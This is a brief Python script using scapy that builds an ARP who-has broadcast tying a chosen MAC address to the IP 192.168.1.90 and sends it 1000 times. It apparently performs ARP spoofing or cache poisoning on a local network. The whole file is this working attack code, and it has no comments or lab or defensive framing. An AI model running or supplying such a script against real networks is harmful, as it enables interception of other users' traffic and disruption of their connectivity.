from scapy.all import *
COUNT = 1000

pkt = Ether(src="a2:d8:4c:d7:44:60", dst="ff:ff:ff:ff:ff:ff")/ARP(op=ARP.who_has, hwdst="ff:ff:ff:ff:ff:ff", pdst="192.168.1.94", hwsrc="a2:d8:4c:d7:44:60", psrc="192.168.1.90" )

for _ in range(COUNT):
    sendp(pkt)
